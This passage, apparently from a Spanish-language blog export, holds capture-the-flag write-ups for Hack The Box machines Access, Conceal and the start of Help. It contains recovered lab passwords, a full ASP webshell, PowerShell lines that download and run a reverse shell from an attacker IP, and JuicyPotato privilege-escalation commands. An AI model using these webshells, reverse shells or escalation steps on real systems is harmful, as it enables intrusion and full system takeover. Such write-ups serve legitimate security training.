Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.017 days (since Sat Sep 29 20:54:14 2018) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: Busy server or unknown class Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 342.05 ms 10.10.12.1 (10.10.12.1) 2 340.87 ms 10.10.10.98 (10.10.10.98) NSE: Script Post-scanning. Initiating NSE at 21:19 Completed NSE at 21:19, 0.00s elapsed Initiating NSE at 21:19 Completed NSE at 21:19, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 646.94 seconds Raw packets sent: 131457 (5.788MB) | Rcvd: 537 (26.626KB)   HTTP Se utilizo la herramienta gobuster para realizar una busqueda de archivos, directorios, etc. dentro del sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@sckull:~/htb/access# gobuster -u http://10.10.10.98/ -w /usr/share/wordlists/dirb/common.txt -np -x asp,aspx,txt,html -t 15 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.98/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : aspx,txt,html,asp [+] Timeout : 10s ===================================================== 2019/03/03 02:43:38 Starting gobuster ===================================================== /Index.html (Status: 200)   No encontramos mucho para poder explorar mas que solo el index.html.\nFTP Iniciamos sesion en el servicio FTP con el usuario y contraseña \u0026lsquo;anonymous\u0026rsquo;. Dentro de este encontramos dos carpetas y dos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  root@sckull:~/htb/access# ftp 10.10.10.98 Connected to 10.10.10.98. 220 Microsoft FTP Service Name (10.10.10.98:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls -la 200 PORT command successful. 150 Opening ASCII mode data connection. 08-23-18 08:16PM \u0026lt;DIR\u0026gt; Backups 08-24-18 09:00PM \u0026lt;DIR\u0026gt; Engineer 226 Transfer complete. ftp\u0026gt; cd Backups 250 CWD command successful. ftp\u0026gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 08:16PM 5652480 backup.mdb 226 Transfer complete. ftp\u0026gt; bin 200 Type set to I. ftp\u0026gt; get backup.mdb local: backup.mdb remote: backup.mdb 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 5652480 bytes received in 147.73 secs (37.3663 kB/s) ftp\u0026gt; cd ../Engineer 250 CWD command successful. ftp\u0026gt; ls -lah 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-24-18 12:16AM 10870 Access Control.zip 226 Transfer complete. ftp\u0026gt; get Access\\ Control.zip local: Access Control.zip remote: Access Control.zip 200 PORT command successful. 150 Opening BINARY mode data connection. 226 Transfer complete. 10870 bytes received in 4.72 secs (2.2477 kB/s) ftp\u0026gt; quit 221 Goodbye. root@sckull:~/htb/access# ls \u0026#39;Access Control.zip\u0026#39; backup.mdb   Ahora tenemos dos archivos \u0026lsquo;Access Control.zip\u0026rsquo; y \u0026lsquo;backup.mdb\u0026rsquo;.\nAnalizando los archivos de que obtuvimos en FTP, encontramos que backup.mdb es un archivo de Microsoft Access Database y Access Control.zip al intentar descomprimir los archivos dentro, nos pide una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~/htb/access# file backup.mdb backup.mdb: Microsoft Access Database root@sckull:~/htb/access# file \u0026#39;Access Control.zip\u0026#39; Access Control.zip: Zip archive data, at least v2.0 to extract root@sckull:~/htb/access# binwalk \u0026#39;Access Control.zip\u0026#39; DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, encrypted at least v2.0 to extract, compressed size: 10678, uncompressed size: 271360, name: Access Control.pst 10848 0x2A60 End of Zip archive, footer length: 22   En el primer archivo utilizamos la pagina \u0026lsquo;https://www.mdbopener.com/' para realizar alguna busqueda de datos que nos pudiesen ayudar de alguna forma en algun otro servicio y encontramos una base de datos de lo que parece ser de una empresa, nos centramos en datos de usuarios y contraseñas y econtramos una tabla que se hace llamar \u0026lsquo;auth_user\u0026rsquo; con los siguientes datos:\nTABLAS auth_user Utilizando la contraseña \u0026lsquo;access4u@security\u0026rsquo; para descomprimir los archivos que \u0026lsquo;Access Control.zip\u0026rsquo; contiene, encontramos un archivo \u0026lsquo;Access Control.pst\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@sckull:~/htb/access# 7z x \u0026#39;Access Control.zip\u0026#39; 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 10870 bytes (11 KiB) Extracting archive: Access Control.zip -- Path = Access Control.zip Type = zip Physical Size = 10870 Enter password (will not be echoed): Everything is Ok Size: 271360 Compressed: 10870 root@sckull:~/htb/access# ls \u0026#39;Access Control.pst\u0026#39;   Utilizando readpst para lectura del archivo, nos genera un archivo de tipo mbox.\n1 2 3 4 5 6 7  root@sckull:~/htb/access# readpst \u0026#39;Access Control.pst\u0026#39; Opening PST file and indexes... Processing Folder \u0026#34;Deleted Items\u0026#34; \u0026#34;Access Control\u0026#34; - 2 items done, 0 items skipped. root@sckull:~/htb/access# ls \u0026#39;Access Control.mbox\u0026#39;   Para lectura de este archivo utilizamos \u0026lsquo;mail -f Access Control.mbox\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@sckull:~/htb/access# mail -f Access\\ Control.mbox Status: RO From: john@megacorp.com \u0026lt;john@megacorp.com\u0026gt; Subject: MegaCorp Access Control System \u0026#34;security\u0026#34; account To: \u0026#39;security@accesscontrolsystems.com\u0026#39; Date: Thu, 23 Aug 2018 23:44:07 +0000 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary=\u0026#34;--boundary-LibPST-iamunique-387867163_-_-\u0026#34; ----boundary-LibPST-iamunique-387867163_-_- Content-Type: multipart/alternative; boundary=\u0026#34;alt---boundary-LibPST-iamunique-387867163_-_-\u0026#34; --alt---boundary-LibPST-iamunique-387867163_-_- Content-Type: text/plain; charset=\u0026#34;utf-8\u0026#34; Hi there, The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers. Regards, John ....   Telnet - Obteniendo Acceso Como pudimos observar el archivo \u0026lsquo;Access Control.mbox\u0026rsquo; es un archivo que contiene un email, dentro de el John nos indica que la contraseña para el usuario \u0026lsquo;security\u0026rsquo; fue cambiada a \u0026lsquo;4Cc3ssC0ntr0ller\u0026rsquo;. Aprovechando estos datos procedemos a utilizar el servicio telnet para conectarnos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  root@sckull:~/htb/access# telnet 10.10.10.98 Trying 10.10.10.98... Connected to 10.10.10.98. Escape character is \u0026#39;^]\u0026#39;. Welcome to Microsoft Telnet Service login: security password: *=============================================================== Microsoft Telnet Server. *=============================================================== C:\\Users\\security\u0026gt;cd Desktop C:\\Users\\security\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of C:\\Users\\security\\Desktop 03/03/2019 03:12 AM \u0026lt;DIR\u0026gt; . 03/03/2019 03:12 AM \u0026lt;DIR\u0026gt; .. 03/03/2019 03:12 AM 73,802 shell.exe 08/21/2018 10:37 PM 32 user.txt 2 File(s) 73,834 bytes 2 Dir(s) 16,771,272,704 bytes free C:\\Users\\security\\Desktop\u0026gt;more user.txt ff1f3b4[...] C:\\Users\\security\\Desktop\u0026gt;   Y asi obtenemos nuestra primera bandera \u0026lsquo;user.txt\u0026rsquo;.\nPrivilege Escalation Enumerando archivos y directorios no encontramos nada, pero al utilizar el comando \u0026lsquo;cmdkey /list\u0026rsquo; encontramos que el usuario Administrator tiene una contraseña guardada.\n1 2 3 4 5 6 7 8 9 10  C:\\Users\\security\\Links\u0026gt;cmdkey /list Currently stored credentials: Target: Domain:interactive=ACCESS\\Administrator Type: Domain Password User: ACCESS\\Administrator C:\\Users\\security\\Links\u0026gt;   Utilizando \u0026lsquo;runas\u0026rsquo; para ejecutar comandos con el usuario Administrator y con la contraseña guardada en la maquina. Primero generamos nuestro payload con msfvenom y ponemos a la escucha nuestro exploit.\nRUNAS =\u0026gt; https://ss64.com/nt/runas.html\nMetasploit Msfvenom Teniendo nuestro entorno local listo, procedemos a descargar nuestro payload a la maquina y ejecutarlo con \u0026lsquo;runas\u0026rsquo;.\nCMD Python HTTP Server En nuestro entorno local obtenemos una sesion y con el privilegios de administracion.\nMetasploit - Sesion ","description":"","id":97,"section":"posts","tags":["windows"],"title":"Hack The Box - Access","uri":"https://sckull.github.io/posts/access/"},{"content":"Conceal es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n MASSCAN 1 2 3 4 5 6 7  masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116\u0026lt;/pre\u0026gt;   SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.\n1 2 3 4 5 6 7 8 9 10  [*] System information:Host IP : 10.10.10.116Hostname : ConcealDescription : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)Contact : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43Location : -Uptime snmp : 00:10:11.23Uptime system : 00:09:45.96System date : 2019-3-2 04:26:04.7  IKE VPN password PSK Utilizamos el wordlist rockyou y hashcat para desencriptar la contraseña.\n1  9c8b1a372b1878851be2c097031b6e43 NTLM : Dudecake1!   SETUP IPSEC - IKE VPN Utilizamos strongswan para poder conectarnos mediante una VPN IKE y su configuracion es la siguiente.\nInstalamos strongswan:\n1  sudo apt install strongswan   Configuramos los siguientes archivos.\n[/etc/ipsec.conf]\n1 2 3 4 5 6 7 8 9 10  conn conceal\tauthby=secret\tauto=route\tike=3des-sha1-modp1024\tleft=10.10.12.184\tright=10.10.10.116\tkeyexchange=ikev1\ttype=transport\tesp=3des-sha1 \trightprotoport=tcp  [/etc/ipsec.secrets]\n1 2  10.10.12.184 : PSK \u0026#34;Dudecake1!\u0026#34;10.10.10.116 : PSK \u0026#34;Dudecake1!\u0026#34;  STATUS IPSEC NMAP - IPSEC SMB - IPSEC RPC - IPSEC FTP - IPSEC Nos conectamos como usuario anonymous pero no encontramos nada dentro.\nHTTP - IPSEC Enumerando con gobuster encontramos solo una direccion.\n/upload WEBSHELL Para obtener una webshell utilizamos ftp para subir nuestra webshell y visitar /upload/cmd.asp para interactuar con este.\nWEBSHELL https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;% Set oScript = Server.CreateObject(\u0026#34;WSCRIPT.SHELL\u0026#34;) Set oScriptNet = Server.CreateObject(\u0026#34;WSCRIPT.NETWORK\u0026#34;) Set oFileSys = Server.CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;) Function getCommandOutput(theCommand) Dim objShell, objCmdExec Set objShell = CreateObject(\u0026#34;WScript.Shell\u0026#34;) Set objCmdExec = objshell.exec(thecommand) getCommandOutput = objCmdExec.StdOut.ReadAll end Function %\u0026gt; \u0026lt;HTML\u0026gt; \u0026lt;BODY\u0026gt; \u0026lt;FORM action=\u0026#34;\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;cmd\u0026#34; size=45 value=\u0026#34;\u0026lt;%= szCMD %\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Run\u0026#34;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;PRE\u0026gt; \u0026lt;%= \u0026#34;\\\\\u0026#34; \u0026amp; oScriptNet.ComputerName \u0026amp; \u0026#34;\\\u0026#34; \u0026amp; oScriptNet.UserName %\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_name\u0026#34;))%\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s port:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_port\u0026#34;))%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s software:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_software\u0026#34;))%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s software:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;LOCAL_ADDR\u0026#34;))%\u0026gt; \u0026lt;% szCMD = request(\u0026#34;cmd\u0026#34;) thisDir = getCommandOutput(\u0026#34;cmd /c\u0026#34; \u0026amp; szCMD) Response.Write(thisDir)%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/BODY\u0026gt; \u0026lt;/HTML\u0026gt;   Obtenemos nuestra webshell y podemos ejecutar comandos en la maquina.\nREVERSE SHELL - Nishang Utilizamos una de las shells que tiene nishang https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1, y configuramos un archivo asp para subirlo por ftp y al visitar dicho archivo obtener una shell inversa.\nEn nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la sigueinte linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.\n1  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.188 -Port 443   Nuestro archivo rev_shell.asp contiene lo siguiente.\n1 2 3 4  \u0026lt;%@ Language=VBScript %\u0026gt; \u0026lt;% call Server.CreateObject(\u0026#34;WSCRIPT.SHELL\u0026#34;).Run(\u0026#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.188/Invoke-PowerShellTcp.ps1\u0026#39;)\u0026#34;) %\u0026gt;    USER Obtenemos nuestra bandera user.txt.\nSysteminfo Sherlok Utilizando Sherlok para buscar parches que nos pueda servir para escalar privilegios, no encontramos ninguno :/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  PS C:\\Users\\Destitute\\Documents\u0026gt; iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.188/Sherlok.ps1\u0026#39;) PS C:\\Users\\Destitute\\Documents\u0026gt; ls PS C:\\Users\\Destitute\\Documents\u0026gt; Find-Allvulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Not Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135 VulnStatus : Not Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html VulnStatus : Not Vulnerable   WHOAMI /priv Revisamos si SeImpersonatePrivilege esta disponible en la maquina y con el usuario que actualmente tenemos una shell para poder utilizar JuicyPotato para obtener NT AUTHORITY\\SYSTEM.\nPRIVILEGE ESCALATION - JuicyPotato https://github.com/ohpe/juicy-potato\nPara escalar privilegios vamos a utilizar un nuevo documento Invoke-PowerShellTcp-potato.ps1 que contiene una shell inversa, tambien un archivo reverse_shell.bat el cual va ser ejecutado por JuicyPotato.exe (https://ohpe.it/juicy-potato/), se puede descargar JuicyPotato.exe aqui. (https://ohpe.it/juicy-potato/).\nreverse_shell.bat\n1  powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.12.64/Invoke-PowerShellTcp-potato.ps1\u0026#39;)   CLSID Para obtener CLSID para juicypotato vamos a utilizar los siguientes comandos en powershell.\n1 2 3  New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT $CLSID = Get-ItemProperty HKCR:\\clsid\\* | select-object AppID,@{N=\u0026#39;CLSID\u0026#39;; E={$_.pschildname}} | where-object {$_.appid -ne $null} $CLSID   Nos imprimira un alista de AppID y CLSID, copiamos y guardamos los CLSID en un archivo para probar cada uno de ellos con el archivo test_clsid.bat de juicypotato. (https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)\nVamos a hacer un pequeño cambio en nuestro archivo test_clsid.bat, solo cambiamos la ruta de nuestros archivos.\n1 2 3 4 5 6 7 8 9 10 11 12  @echo off :: Starting port, you can change it set /a port=10000 SETLOCAL ENABLEDELAYEDEXPANSION FOR /F %%i IN (C:\\Users\\Destitute\\Videos\\tmp.list) DO ( echo %%i !port! C:\\Users\\Destitute\\Videos\\JuicyPotato.exe -z -l !port! -c %%i \u0026gt;\u0026gt; C:\\Users\\Destitute\\Videos\\result.log set RET=!ERRORLEVEL! :: echo !RET! if \u0026#34;!RET!\u0026#34; == \u0026#34;1\u0026#34; set /a port=port+1 )   Descargamos los archivos necesarios en la maquina.\nEjecutamos test_clsid.bat, el cual nos creara un archivo log (result.log) con las pruebas de CLSID que hay en la lista que creamos anteriormente.\nLista CLSID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  7c5-91bf-4547-81ae-fec91a89dec5};CONCEAL\\Destitute {0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\\LOCAL SERVICE {1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\\LOCAL SERVICE {204810b9-73b2-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {2e5e84e9-4049-4244-b728-2d24227157c7};NT AUTHORITY\\LOCAL SERVICE {30766BD2-EA1C-4F28-BF27-0B44E2F68DB7};NT AUTHORITY\\SYSTEM {42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\\SYSTEM {42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\\SYSTEM {4661626C-9F41-40A9-B3F5-5580E80CB347};NT AUTHORITY\\SYSTEM {4B6C85F1-A6D9-433A-9789-89EA153626ED};NT AUTHORITY\\SYSTEM {6d8ff8d2-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8dc-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8dd-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8df-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e1-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e5-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e7-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {7D096C5F-AC08-4F1F-BEB7-5C22C517CE39};NT AUTHORITY\\SYSTEM {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\\SYSTEM {9678f47f-2435-475c-b24a-4606f8161c16};CONCEAL\\Destitute {97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\\SYSTEM {98068995-54d2-4136-9bc9-6dbcb0a4683f};CONCEAL\\Destitute {9acf41ed-d457-4cc1-941b-ab02c26e4686};CONCEAL\\Destitute {9E175B68-F52A-11D8-B9A5-505054503030};NT AUTHORITY\\SYSTEM {9E175B6D-F52A-11D8-B9A5-505054503030};NT AUTHORITY\\SYSTEM {A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\\LOCAL SERVICE {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6};NT AUTHORITY\\SYSTEM {B31118B2-1F49-48E5-B6F5-BC21CAEC56FB};NT AUTHORITY\\SYSTEM {B52D54BB-4818-4EB9-AA80-F9EACD371DF8};NT AUTHORITY\\SYSTEM {C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\\SYSTEM {C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\\SYSTEM {CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\\SYSTEM {E48EDA45-43C6-48e0-9323-A7B2067D9CD5};NT AUTHORITY\\SYSTEM {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\\SYSTEM {E63DE750-3BD7-4BE5-9C84-6B4281988C44};NT AUTHORITY\\SYSTEM {FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\\SYSTEM   Vamos a utilizar un CLSID ({FFE1E5FE-F1F0-48C8-953E-72BA272F2744}) con NT AUTHORITY\\SYSTEM y una shell inversa (reverse_shell.bat).\n1  .\\JuicyPotato.exe -l 1227 -p C:\\Users\\Destitute\\Videos\\reverse_shell.bat -t * -c \u0026#39;{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};\u0026#39;   De igual manera podemos utilizar uno de la lista que JuicyPotato tiene en su lista de Windows 10 Enterprise (https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise).\nROOT  Obtenemos una shell NT AUTHORITY\\SYSTEM o root :)\nY nuestra bandera root.txt.\n","description":"","id":98,"section":"posts","tags":["windows"],"title":"Hack The Box - Conceal","uri":"https://sckull.github.io/posts/conceal/"},{"content":"Help es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  Nmap 7.70 scan initiated Sat Jan 19 23:53:49 2019 as: nmap -sV -A -sC -o nmap.tcp 10.10.10.121 Nmap scan report for 10.10.10.121 Host is up (0.20s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=1/19%OT=22%CT=1%CU=32374%PV=Y%DS=2%DC=T%G=Y%TM=5C440D3 OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 168.27 ms 10.10.12.1 2 233.79 ms 10.10.10.121 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Sat Jan 19 23:55:02 2019 -- 1 IP address (1 host up) scanned in 74.09 seconds   HTTP - Puerto 80 NODEJS - PUERTO 3000 En este puerto, al visitarlo en firefox nos muestra un mensaje del tipo json.\n1  {\u0026#34;message\u0026#34;:\u0026#34;Hi Shiv, To get access please find the credentials with given query\u0026#34;}   GOBUSTER Realizamos una busquedad de directorios y archivos con gobuser.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@sckull:~/htb/help/stuff# gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.121/ -np -t 25 -x php,html,txt ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.121/ [+] Threads : 25 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt [+] Timeout : 10s ===================================================== 18:29:01 Starting gobuster ===================================================== /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 18:32:32 Finished =====================================================   /support/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.121/support/ [+] Threads : 25 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt [+] Timeout : 10s ===================================================== 18:34:31 Starting gobuster ===================================================== /captcha.php (Status: 200) /controllers (Status: 301) /css (Status: 301) /favicon.ico (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /LICENSE.txt (Status: 200) /readme.html (Status: 200) /uploads (Status: 301) /views (Status: 301) ===================================================== 18:37:12 Finished =====================================================   HelpDeskZ En el la direccion /support encontramos una plataforma HelpDeskZ para soporte de sitios web.\nInvestigamos acerca de esta plataforma y encontramos que podemos subir una shell mediante la creacion de un ticket en la plataforma, y tambien encontramos un exploit que se aprovecha de esta 